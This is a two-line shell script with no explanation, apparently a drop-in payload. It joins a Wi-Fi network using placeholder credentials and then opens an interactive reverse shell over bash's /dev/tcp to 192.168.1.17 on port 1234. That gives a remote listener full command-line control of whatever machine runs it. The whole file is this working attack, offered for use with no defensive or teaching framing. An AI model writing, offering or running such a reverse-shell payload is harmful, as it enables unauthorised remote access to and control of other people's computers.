#!/bin/sh

nmcli dev wifi connect "SSID" password "Password"
bash -c "sh -i >& /dev/tcp/192.168.1.17/1234 0>&1"
